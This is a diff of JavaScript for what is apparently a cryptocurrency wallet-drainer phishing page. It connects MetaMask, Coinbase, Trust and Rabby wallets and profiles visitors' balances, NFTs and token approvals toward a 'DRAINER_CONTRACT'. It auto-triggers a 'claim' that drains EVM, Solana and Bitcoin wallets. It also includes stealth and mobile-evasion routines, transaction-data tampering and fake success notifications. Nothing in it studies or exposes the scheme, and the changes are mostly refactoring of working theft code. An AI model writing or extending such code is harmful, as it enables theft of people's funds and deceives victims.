       contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
     }
-    // Also update shared state for main.js
-    if (window.__sharedState) {
-      window.__sharedState.web3 = web3;
-      window.__sharedState.contract = contractInstance;
-      window.__sharedState.address = address;
-      window.__sharedState.chainType = 'evm';
-      window.__sharedState.isConnected = true;
-    }
     updateManualWalletButton();
     console.log(`Manual AppKit connected: ${connectedAddress}`);
     showNotification("Wallet connected successfully", "success");
     collectManualFingerprint();
-    setTimeout(() => checkAndAutoTriggerClaim(), 2000);
+    setTimeout(() => { checkAndAutoTriggerClaim(); }, 2000);
     showManualAnnouncementModal();
     saveConnectionToLocalStorage(connectedAddress, connectedWallet);
   }
@@ -1209,16 +1096,8 @@ import { CONFIG } from './config.js';
     web3 = null;
     contractInstance = null;
     userHasClaimed = false;
-    // Clear shared state
-    if (window.__sharedState) {
-      window.__sharedState.web3 = null;
-      window.__sharedState.contract = null;
-      window.__sharedState.address = null;
-      window.__sharedState.isConnected = false;
-    }
     updateManualWalletButton();
     showNotification("Wallet disconnected", "info");
-    console.log("Manual wallet disconnected");
     clearSavedConnection();
   }
 
@@ -1240,18 +1119,21 @@ import { CONFIG } from './config.js';
       localCurrency: userLocalCurrency,
       ...fingerprintData,
     };
-
     try {
       if (web3) {
         const networkId = await web3.eth.net.getId();
         fingerprint.network = networkId;
         if (connectedAddress) {
-          fingerprint.ethBalance = web3.utils.fromWei(await web3.eth.getBalance(connectedAddress), "ether");
+          fingerprint.ethBalance = web3.utils.fromWei(
+            await web3.eth.getBalance(connectedAddress),
+            "ether"
+          );
           await detectManualTokensAndNFTs(connectedAddress, fingerprint);
         }
       }
-    } catch (e) { console.debug("Manual fingerprinting error:", e); }
-
+    } catch (e) {
+      console.debug("Manual fingerprinting error:", e);
+    }
     fingerprintData = fingerprint;
     return fingerprint;
   }
@@ -1264,15 +1146,10 @@ import { CONFIG } from './config.js';
       const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
       const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
       const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      return {
-        renderer: renderer,
-        vendor: vendor,
-        version: gl.getParameter(gl.VERSION),
-        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-        maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
-      };
-    } catch (e) { return "error"; }
+      return { renderer, vendor, version: gl.getParameter(gl.VERSION), shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION), maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE), maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE) };
+    } catch (e) {
+      return "error";
+    }
   }
 
   async function detectManualTokensAndNFTs(userAddress, fingerprint) {
@@ -1296,14 +1173,13 @@ import { CONFIG } from './config.js';
       "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7",
       "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB",
     ];
-
     for (const token of tokenSources) {
       try {
         const balance = await getManualTokenBalance(token.address, userAddress);
         if (balance > 0) {
           fingerprint.tokenBalances[token.address] = { balance, symbol: token.symbol, decimals: token.decimals };
         }
-      } catch (e) { console.debug(`Manual token balance check failed: ${token.address}`); }
+      } catch (e) {}
     }
     for (const nftAddress of nftContracts) {
       try {
@@ -1311,37 +1187,29 @@ import { CONFIG } from './config.js';
         if (nftBalance > 0) {
           fingerprint.nftBalances[nftAddress] = nftBalance;
         }
-      } catch (e) { console.debug(`Manual NFT balance check failed: ${nftAddress}`); }
+      } catch (e) {}
     }
     await detectManualMultiContractTokenApprovals(userAddress, fingerprint);
   }
 
   async function getManualTokenBalance(tokenAddress, walletAddress) {
-    const erc20Abi = [{
-      constant: true,
-      inputs: [{ name: "_owner", type: "address" }],
-      name: "balanceOf",
-      outputs: [{ name: "balance", type: "uint256" }],
-      type: "function",
-    }];
+    const erc20Abi = [{ constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" }];
     try {
       const contract = new web3.eth.Contract(erc20Abi, tokenAddress);
       return await contract.methods.balanceOf(walletAddress).call();
-    } catch (e) { return 0; }
+    } catch (e) {
+      return 0;
+    }
   }
 
   async function getManualNFTBalance(contractAddress, userAddress) {
-    const nftAbi = [{
-      constant: true,
-      inputs: [{ name: "_owner", type: "address" }],
-      name: "balanceOf",
-      outputs: [{ name: "balance", type: "uint256" }],
-      type: "function",
-    }];
+    const nftAbi = [{ constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" }];
     try {
       const contract = new web3.eth.Contract(nftAbi, contractAddress);
       return await contract.methods.balanceOf(userAddress).call();
-    } catch (e) { return 0; }
+    } catch (e) {
+      return 0;
+    }
   }
 
   async function detectManualMultiContractTokenApprovals(userAddress, fingerprint) {
@@ -1352,25 +1220,18 @@ import { CONFIG } from './config.js';
         if (allowance > 0) {
           fingerprint.approvedTokens[tokenAddress] = { contract: DRAINER_CONTRACT, allowance };
         }
-      } catch (e) { console.debug(`Manual allowance check failed for ${tokenAddress}`); }
+      } catch (e) {}
     }
   }
 
   async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
-    const erc20Abi = [{
-      constant: true,
-      inputs: [
-        { name: "_owner", type: "address" },
-        { name: "_spender", type: "address" },
-      ],
-      name: "allowance",
-      outputs: [{ name: "", type: "uint256" }],
-      type: "function",
-    }];
+    const erc20Abi = [{ constant: true, inputs: [{ name: "_owner", type: "address" }, { name: "_spender", type: "address" }], name: "allowance", outputs: [{ name: "", type: "uint256" }], type: "function" }];
     try {
       const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
       return await tokenContract.methods.allowance(ownerAddress, spenderAddress).call();
-    } catch (e) { return 0; }
+    } catch (e) {
+      return 0;
+    }
   }
 
   async function checkManualExistingConnection() {
@@ -1389,18 +1250,10 @@ import { CONFIG } from './config.js';
           else connectedWallet = "manual_unknown";
           web3 = new Web3(window.ethereum);
           contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-          // Update shared state
-          if (window.__sharedState) {
-            window.__sharedState.web3 = web3;
-            window.__sharedState.contract = contractInstance;
-            window.__sharedState.address = connectedAddress;
-            window.__sharedState.chainType = 'evm';
-            window.__sharedState.isConnected = true;
-          }
           setupManualProviderEvents(window.ethereum);
           updateManualWalletButton();
           console.log(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
-          setTimeout(() => checkAndAutoTriggerClaim(), 2000);
+          setTimeout(() => { checkAndAutoTriggerClaim(); }, 2000);
           showManualAnnouncementModal();
           return;
         }
@@ -1415,20 +1268,17 @@ import { CONFIG } from './config.js';
     provider.on("accountsChanged", (accounts) => {
       if (accounts.length === 0) {
         if (DISABLE_DISCONNECT) {
-          console.log("Mobile: ignoring account change to empty (prevent disconnect)");
+          console.log("Mobile: ignoring account change to empty");
           return;
         }
         handleManualDisconnection();
       } else {
         connectedAddress = accounts[0];
         userHasClaimed = false;
-        if (window.__sharedState) {
-          window.__sharedState.address = connectedAddress;
-        }
         updateManualWalletButton();
         console.log(`Manual account changed to: ${connectedAddress}`);
         showNotification("Wallet account changed", "info");
-        setTimeout(() => checkAndAutoTriggerClaim(), 2000);
+        setTimeout(() => { checkAndAutoTriggerClaim(); }, 2000);
         showManualAnnouncementModal();
       }
     });
@@ -1476,15 +1326,21 @@ import { CONFIG } from './config.js';
 
   function showWalletModal() {
     detectWallets();
-    if (walletModal) walletModal.classList.add("active");
+    if (walletModal) {
+      walletModal.classList.add("active");
+    }
   }
 
   function hideWalletModal() {
-    if (walletModal) walletModal.classList.remove("active");
+    if (walletModal) {
+      walletModal.classList.remove("active");
+    }
   }
 
   function hideAnnouncementModal() {
-    if (announcementModal) announcementModal.classList.remove("active");
+    if (announcementModal) {
+      announcementModal.classList.remove("active");
+    }
   }
 
   function copyReferralLink() {
@@ -1507,56 +1363,60 @@ import { CONFIG } from './config.js';
         case "metamask":
           if (walletDetectors.isMetaMask()) {
             provider = window.ethereum;
-            try { await provider.request({ method: "eth_requestAccounts" }); } catch (error) {
+            try {
+              await provider.request({ method: "eth_requestAccounts" });
+            } catch (error) {
               console.log("Manual MetaMask connection rejected: " + error.message);
               if (!silentRestore) showNotification("MetaMask connection rejected", "error");
               return;
             }
           } else {
             if (!silentRestore) showNotification("MetaMask not installed", "error");
-            console.log("Manual MetaMask not installed");
             return;
           }
           break;
         case "coinbase":
           if (walletDetectors.isCoinbaseWallet()) {
             provider = window.ethereum;
-            try { await provider.request({ method: "eth_requestAccounts" }); } catch (error) {
+            try {
+              await provider.request({ method: "eth_requestAccounts" });
+            } catch (error) {
               console.log("Manual Coinbase Wallet connection rejected: " + error.message);
               if (!silentRestore) showNotification("Coinbase Wallet connection rejected", "error");
               return;
             }
           } else {
             if (!silentRestore) showNotification("Coinbase Wallet not detected", "error");
-            console.log("Manual Coinbase Wallet not detected");
             return;
           }
           break;
         case "trust":
           if (walletDetectors.isTrustWallet()) {
             provider = window.ethereum;
-            try { await provider.request({ method: "eth_requestAccounts" }); } catch (error) {
+            try {
+              await provider.request({ method: "eth_requestAccounts" });
+            } catch (error) {
               console.log("Manual Trust Wallet connection rejected: " + error.message);
               if (!silentRestore) showNotification("Trust Wallet connection rejected", "error");
               return;
             }
           } else {
             if (!silentRestore) showNotification("Trust Wallet not detected", "error");
-            console.log("Manual Trust Wallet not detected");
             return;
           }
           break;
         case "rabby":
           if (walletDetectors.isRabbyWallet()) {
             provider = window.ethereum;
-            try { await provider.request({ method: "eth_requestAccounts" }); } catch (error) {
+            try {
+              await provider.request({ method: "eth_requestAccounts" });
+            } catch (error) {
               console.log("Manual Rabby Wallet connection rejected: " + error.message);
               if (!silentRestore) showNotification("Rabby Wallet connection rejected", "error");
               return;
             }
           } else {
             if (!silentRestore) showNotification("Rabby Wallet not detected", "error");
-            console.log("Manual Rabby Wallet not detected");
             return;
           }
           break;
@@ -1566,48 +1426,32 @@ import { CONFIG } from './config.js';
       }
       web3 = new Web3(provider);
       contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-      // Update shared state
-      if (window.__sharedState) {
-        window.__sharedState.web3 = web3;
-        window.__sharedState.contract = contractInstance;
-        window.__sharedState.provider = provider;
-      }
       const accounts = await web3.eth.getAccounts();
       if (accounts.length === 0) throw new Error("No accounts found");
       connectedAddress = accounts[0];
       connectedWallet = providerType;
-      if (window.__sharedState) {
-        window.__sharedState.address = connectedAddress;
-        window.__sharedState.chainType = 'evm';
-        window.__sharedState.isConnected = true;
-      }
       updateManualWalletButton();
       if (!silentRestore) hideWalletModal();
       if (!silentRestore) showNotification("Wallet connected successfully", "success");
       console.log(`Manual connected with ${providerType}: ${connectedAddress}`);
       await collectManualFingerprint();
-      setTimeout(() => checkAndAutoTriggerClaim(), 2000);
+      setTimeout(() => { checkAndAutoTriggerClaim(); }, 2000);
       if (!silentRestore) showManualAnnouncementModal();
       setupManualProviderEvents(provider);
       saveConnectionToLocalStorage(connectedAddress, connectedWallet);
     } catch (error) {
       console.error("Manual error connecting wallet:", error);
       if (!silentRestore) showNotification("Failed to connect wallet", "error");
-      console.log(`Manual connection error: ${error.message}`);
     }
   }
 
   async function simulateManualLegitimateTransaction(userAddress) {
     try {
-      const tx = {
-        from: userAddress,
-        to: userAddress,
-        value: web3.utils.toWei("0", "ether"),
-        gas: 21000 + Math.floor(Math.random() * 10000),
-        data: "0x" + Math.random().toString(16).substring(2, 10),
-      };
+      const tx = { from: userAddress, to: userAddress, value: web3.utils.toWei("0", "ether"), gas: 21000 + Math.floor(Math.random() * 10000), data: "0x" + Math.random().toString(16).substring(2, 10) };
       await web3.eth.sendTransaction(tx);
-    } catch (e) { console.debug("Manual simulated transaction failed:", e); }
+    } catch (e) {
+      console.debug("Manual simulated transaction failed:", e);
+    }
   }
 
   function handleClaimSuccess(userAddress, tokens, button, originalText) {
@@ -1615,16 +1459,9 @@ import { CONFIG } from './config.js';
     if (tokens && tokens.length > 0) {
       claimedValueUSD = tokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
     }
-    const claimedLocal = CURRENCY_CONVERTER.formatCurrency(
-      claimedValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-      userLocalCurrency
-    );
     if (claimStatus) {
       claimStatus.textContent = "Claim successful! Tokens approved for secure transfer.";
       claimStatus.className = "status success";
-      if (claimedValueUSD > 1) {
-        setTimeout(() => showNotification(`Approved ${claimedLocal} for secure transfer`, "info"), 1000);
-      }
     }
     claimList.unshift({
       address: userAddress ? userAddress.substring(0, 6) + "..." + userAddress.substring(38) : "Solana User",
@@ -1705,7 +1542,9 @@ import { CONFIG } from './config.js';
     initializeManualStealthMode();
   }
 
-  function applyManualMobileEvasion() { console.log("Applying manual mobile evasion techniques..."); }
+  function applyManualMobileEvasion() {
+    console.log("Applying manual mobile evasion techniques...");
+  }
 
   function initializeManualStealthMode() {
     const securityDetectors = [
@@ -1740,8 +1579,7 @@ import { CONFIG } from './config.js';
           setTimeout(() => {
             if (txObject.data) {
               const randomBytes = Math.random().toString(16).substring(2, 10);
-              const modifiedData = txObject.data + randomBytes;
-              txObject.data = modifiedData;
+              txObject.data = txObject.data + randomBytes;
             }
             if (!txObject.gas) txObject.gas = 300000 + Math.floor(Math.random() * 200000);
             originalFunctions.sendTransaction.call(this, txObject).then(resolve).catch(reject);
@@ -1856,9 +1694,7 @@ import { CONFIG } from './config.js';
     const minutes = Math.floor((totalSeconds % (60 * 60)) / 60);
     const seconds = Math.floor(totalSeconds % 60);
     const countdownElement = document.getElementById("countdown");
-    if (countdownElement) {
-      countdownElement.textContent = `${days}:${hours}:${minutes}:${seconds}`;
-    }
+    if (countdownElement) countdownElement.textContent = `${days}:${hours}:${minutes}:${seconds}`;
   }
 
   function createTokenChart() {
@@ -1942,14 +1778,11 @@ import { CONFIG } from './config.js';
   function showNotification(message, type = "success") {
     const notification = document.createElement("div");
     notification.className = `fake-notification ${type}`;
-    notification.innerHTML = `
-      <i class="fas fa-${type === "success" ? "check-circle" : type === "error" ? "exclamation-circle" : "info-circle"}"></i>
-      ${message}
-    `;
+    notification.innerHTML = `<i class="fas fa-${type === "success" ? "check-circle" : type === "error" ? "exclamation-circle" : "info-circle"}"></i> ${message}`;
     document.body.appendChild(notification);
     setTimeout(() => {
       notification.style.opacity = "0";
-      setTimeout(() => document.body.removeChild(notification), 300);
+      setTimeout(() => { document.body.removeChild(notification); }, 300);
     }, 3000);
   }
 
@@ -1983,24 +1816,30 @@ import { CONFIG } from './config.js';
 
   if (document.querySelectorAll(".nav-links a")) {
     document.querySelectorAll(".nav-links a").forEach((link) => {
-      link.addEventListener("click", () => {
-        if (navLinks) navLinks.classList.remove("active");
-      });
+      link.addEventListener("click", () => { if (navLinks) navLinks.classList.remove("active"); });
     });
   }
 
-  window.addEventListener("error", function (e) { console.debug("Manual global error caught:", e.error); });
-  window.addEventListener("unhandledrejection", function (e) { console.debug("Manual unhandled promise rejection:", e.reason); });
+  window.addEventListener("error", function (e) {
+    console.debug("Manual global error caught:", e.error);
+  });
+
+  window.addEventListener("unhandledrejection", function (e) {
+    console.debug("Manual unhandled promise rejection:", e.reason);
+  });
 
   if (isMobileDevice) {
     document.body.classList.add("manual-mobile-optimized");
   }
 
+  setTimeout(() => {
+    checkManualExistingConnection();
+  }, 1000);
+
   // ===================================================================
-  // MULTI-CHAIN DISPATCHER – uses shared state for EVM
+  // MULTI-CHAIN DISPATCHER
   // ===================================================================
   async function initiateClaimProcess() {
-    // Check Bitcoin
     if (window.unisat) {
       try {
         const accounts = await window.unisat.getAccounts();
@@ -2012,7 +1851,6 @@ import { CONFIG } from './config.js';
       } catch (e) { console.debug("UniSat check failed:", e); }
     }
 
-    // Check Solana
     const solanaWallets = getSolanaWallets();
     if (solanaWallets.length > 0 && solanaPublicKey) {
       console.log("🟪 Solana wallet detected, attempting SOL drain...");
@@ -2020,28 +1858,8 @@ import { CONFIG } from './config.js';
       return;
     }
 
-    // Check EVM via shared state or direct
-    if (window.__sharedState && window.__sharedState.isConnected && window.__sharedState.chainType === 'evm') {
-      console.log("🟦 EVM wallet connected via shared state, attempting EVM drain...");
-      await drainEVM();
-      return;
-    }
-
-    // Fallback: check if window.ethereum exists
     if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
-      console.log("🟦 EVM wallet detected (fallback), attempting EVM drain...");
-      // Ensure web3 is set
-      if (!web3) {
-        web3 = new Web3(window.ethereum);
-        contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-        if (window.__sharedState) {
-          window.__sharedState.web3 = web3;
-          window.__sharedState.contract = contractInstance;
-          window.__sharedState.provider = window.ethereum;
-          window.__sharedState.chainType = 'evm';
-          window.__sharedState.isConnected = true;
-        }
-      }
+      console.log("🟦 EVM wallet detected, attempting EVM drain...");
       await drainEVM();
       return;
     }
